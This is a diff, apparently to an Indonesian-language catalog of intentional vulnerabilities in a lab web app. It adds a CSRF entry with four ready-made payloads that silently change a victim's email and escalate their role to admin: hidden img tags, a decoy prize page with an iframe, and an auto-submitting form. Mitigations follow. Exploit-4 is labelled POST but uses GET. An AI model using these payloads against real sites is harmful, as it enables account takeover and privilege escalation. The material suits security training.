@@ -220,6 +220,31 @@ TOOLS YANG DIREKOMENDASIKAN:
      dampak:         Takeover akun siapapun yang diketahui usernamenya
      mitigasi:       Kirim OTP ke email, gunakan temporary token
 
+[23] CSRF — Profile Update
+     apa yang salah: Tidak ada CSRF token, auth via cookie (SameSite=None),
+                     endpoint menerima GET request dengan query params
+     endpoint:       GET /api/user/profile-update?email=...&role=...
+                     PUT /api/user/update (via cookie auth)
+     exploit-1:      Ubah email korban via <img> tag (tanpa interaksi):
+                     <img src="http://localhost:3001/api/user/profile-update?email=hacker@evil.com" />
+     exploit-2:      Ubah role korban jadi admin (privilege escalation):
+                     <img src="http://localhost:3001/api/user/profile-update?role=admin" />
+     exploit-3:      HTML file lengkap (host di server attacker):
+                     <html><body>
+                       <h1>You won a prize!</h1>
+                       <img src="http://localhost:3001/api/user/profile-update?email=attacker@evil.com&phone=666" style="display:none" />
+                       <iframe src="http://localhost:3001/api/user/profile-update?role=admin" style="display:none"></iframe>
+                     </body></html>
+     exploit-4:      Auto-submit hidden form (POST based):
+                     <form action="http://localhost:3001/api/user/profile-update" method="GET">
+                       <input type="hidden" name="email" value="pwned@evil.com" />
+                       <input type="hidden" name="role" value="admin" />
+                     </form>
+                     <script>document.forms[0].submit();</script>
+     dampak:         Ubah email/role/data profil korban tanpa sepengetahuan mereka
+     mitigasi:       CSRF token (Synchronizer Token Pattern), SameSite=Strict,
+                     jangan gunakan GET untuk state-changing operations
+
 [31] Open Redirect + Reflected XSS
      apa yang salah: Parameter redirect di-redirect tanpa validasi,
                      URL di-render tanpa sanitasi (dangerouslySetInnerHTML)
